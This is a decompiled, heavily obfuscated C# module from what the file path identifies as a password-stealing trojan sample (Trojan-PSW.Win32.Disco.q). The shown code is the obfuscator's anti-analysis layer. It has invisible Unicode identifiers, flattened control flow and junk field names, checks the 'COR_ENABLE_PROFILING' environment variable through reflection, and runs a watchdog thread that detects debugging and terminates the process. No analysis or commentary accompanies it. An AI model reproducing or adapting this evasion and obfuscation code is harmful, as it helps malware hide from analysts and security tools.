// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: вє∂ѕ ρяσтє¢тσя - 617877654137728372248718558, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BC66CD4C-2B44-4262-9331-5C92542246A5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.Win32.Disco.q-9518b3b8d9e494dce8eef3b298ed62d9c7ba5faeb64cc360409ce600aa7a972d.exe

using idk.Properties;
using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static FileStream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Exception Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ProcessStartInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Stream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static FileStream Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Random Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static object[] Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ProcessStartInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static IntPtr Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectSearcher Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectCollection Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObjectCollection.ManagementObjectEnumerator Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementBaseObject Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static string Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ArrayList Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementClass Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ManagementObject Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static int Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static bool Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ResourceManager Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static ResourceManager Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static CultureInfo Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;
  public static Settings Beds\u002DProtector\u002DThe\u002DQuick\u002DBrown\u002DFox\u002DJumped\u002DOver\u002DThe\u002DLazy\u002DDog;

  static \u003CModule\u003E()
  {
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogOBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogOBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ();
    \u003CModule\u003E.\u200B‍‪‌‭⁬‫‏‫⁯‌⁪‭⁮⁯‍⁫‌‬⁬‌‌⁭‍‏‫⁫⁯⁯⁪‪‏‭⁬⁪​⁮‏‍‍‮();
  }

  private static void \u200B‍‪‌‭⁬‫‏‫⁯‌⁪‭⁮⁯‍⁫‌‬⁬‌‌⁭‍‏‫⁫⁯⁯⁪‪‏‭⁬⁪​⁮‏‍‍‮()
  {
    int num = 37977 - 118518 + 80541;
    do
    {
      if (num != 62811 - 47797 - 15008)
        goto label_3;
label_2:
      object obj = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) new ParameterizedThreadStart(\u003CModule\u003E.\u200F‮‭‫‭‬‪‎‭‬‍⁬⁬⁬‌‏‭‪⁭‮⁫‮⁮⁬⁯‏‌‏​‮⁪⁫‍⁭​⁭⁮‏⁭‌‮));
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(obj, true);
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(obj, (object) null);
      num = 11050 - 33873 + 22830;
label_3:
      MethodInfo methodInfo;
      if (num == 27768 - 44498 + 16733)
      {
        if ((object) methodInfo != null)
          num = 47956 - 21242 - 26710;
        else
          goto label_2;
      }
      if (num == 46694 + 11594 - 58283)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
        num = 96836 - 129523 + 32693;
      }
      string str;
      if (num == 27281 - 68047 + 40770)
      {
        if (\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) "1", \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) methodInfo, (object) null, new object[1]
        {
          (object) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(str, "_ENABLE_PROFILING")
        })))
          num = 44220 - 121622 + 77407;
        else
          goto label_2;
      }
      if (num == 98780 - 18476 - 80303)
      {
        str = "COR";
        num = 81830 - 15122 - 66706;
      }
      if (num == 54293 - 85832 + 31541)
      {
        // ISSUE: type reference
        // ISSUE: type reference
        methodInfo = (MethodInfo) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(__typeref (Environment)), "GetEnvironmentVariable", new Type[1]
        {
          (Type) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(__typeref (string))
        });
        num = 81648 - 142179 + 60534;
      }
      if (num == 476 - 33196 + 32720)
        num = 50818 - 65135 + 14318;
    }
    while (num != 67286 - 61619 - 5660);
  }

  private static void \u200F‮‭‫‭‬‪‎‭‬‍⁬⁬⁬‌‏‭‪⁭‮⁫‮⁮⁬⁯‏‌‏​‮⁪⁫‍⁭​⁭⁮‏⁭‌‮([In] object obj0)
  {
    int num = 66692 - 134555 + 67863;
label_1:
    if (num != 8311 - 25101 + 16802)
      goto label_3;
label_2:
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(1000);
    num = 7826 + 54109 - 61922;
label_3:
    if (num != 29133 + 39771 - 68897)
      goto label_6;
label_4:
    if (!\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ())
      num = 12891 + 37601 - 50484;
    else
      goto label_26;
label_6:
    if (num != 42527 - 11256 - 31261)
      goto label_9;
label_7:
    Thread thread;
    if (!\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread))
      num = 50027 - 70867 + 20851;
    else
      goto label_2;
label_9:
    if (num == 95168 - 34496 - 60664)
    {
      if (\u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ())
        num = 97749 - 180797 + 83057;
      else
        goto label_7;
    }
    if (num == 99973 - 141298 + 41331)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(500);
      num = 26452 - 57615 + 31170;
    }
    if (num == 71747 - 40767 - 30978)
    {
      if (thread == null)
        num = 12439 - 68791 + 56355;
      else
        goto label_4;
    }
    if (num == 33031 + 49903 - 82931)
    {
      thread = (Thread) \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) new ParameterizedThreadStart(\u003CModule\u003E.\u200F‮‭‫‭‬‪‎‭‬‍⁬⁬⁬‌‏‭‪⁭‮⁫‮⁮⁬⁯‏‌‏​‮⁪⁫‍⁭​⁭⁮‏⁭‌‮));
      num = 69618 - 12680 - 56934;
    }
    if (num == 91636 - 153300 + 61665)
    {
      thread = obj0 as Thread;
      num = 82236 - 77930 - 4304;
    }
    if (num == 83056 - 36688 - 46363)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread, \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ());
      num = 84808 - 149982 + 65180;
    }
    if (num == 79121 + 7198 - 86315)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((object) thread, true);
      num = 33745 - 67972 + 34232;
    }
    if (num != 21075 + 20591 - 41657)
      goto label_27;
label_26:
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
    num = 37727 - 117898 + 80181;
label_27:
    if (num == 52925 + 19505 - 72419)
    {
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((string) null);
      num = 18587 + 74905 - 93480;
    }
    if (num == 50150 + 37919 - 88069)
      num = 29755 + 3730 - 33484;
    if (num != 46794 + 21391 - 68172)
      goto label_1;
    else
      goto label_4;
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeTypeHandle obj0)
  {
    int num = 22648 + 37026 - 59674;
    do
    {
      if (num == 84806 - 145370 + 60564)
        num = 65797 - 2841 - 62955;
    }
    while (num != 70039 - 23992 - 46046);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Õª\u0018\u0026\u007C(obj0);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogbThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogbᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeTypeHandle obj0)
  {
    int num = 48698 - 20141 - 28557;
    do
    {
      if (num == 15276 - 112296 + 97020)
        num = 81483 - 159685 + 78203;
    }
    while (num != 31884 - 14748 - 17135);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.q8é\u0024ü(obj0);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] string obj1,
    [In] Type[] obj2)
  {
    int num = 52883 - 6909 - 45974;
    do
    {
      if (num == 77111 - 72662 - 4449)
        num = 52831 - 16431 - 36399;
    }
    while (num != 66059 - 135981 + 69923);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0026k\u005DY\u0008(obj0, obj1, obj2);
  }

  static string Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0,
    [In] string obj1)
  {
    int num = 81983 - 160899 + 78916;
    do
    {
      if (num == 19617 - 44463 + 24846)
        num = 74503 + 9463 - 83965;
    }
    while (num != 47433 - 123954 + 76522);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u00A2\u003E\u0028\u0018g(obj0, obj1);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogCThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogCᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1,
    [In] object[] obj2)
  {
    int num = 59511 - 111713 + 52202;
    do
    {
      if (num == 18543 + 36463 - 55006)
        num = 89969 - 54723 - 35245;
    }
    while (num != 42538 - 2488 - 40049);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogMAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogMAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.b3\u00952Ê(obj0, obj1, obj2);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogdThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogdᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 14590 - 16362 + 1772;
    do
    {
      if (num == 58505 - 54700 - 3805)
        num = 9646 - 75108 + 65463;
    }
    while (num != 58634 - 57644 - 989);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogpAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogpAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0023\u007Cú\u000FG(obj0, obj1);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogDThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogDᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 18104 - 27126 + 9022;
    do
    {
      if (num == 53356 - 50071 - 3284)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogRAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogRAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ökì\u001AÔ(obj0);
        num = 24499 + 33170 - 57667;
      }
      if (num == 69452 - 54438 - 15014)
        num = 20199 + 52247 - 72445;
    }
    while (num != 81393 - 159814 + 78423);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogeThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogeᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 34678 - 13682 - 20996;
    do
    {
      if (num == 26154 + 38867 - 65021)
        num = 23073 - 110729 + 87657;
    }
    while (num != 80159 - 73577 - 6581);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogsAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogsAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ô\u005B\u007DÂp(obj0);
  }

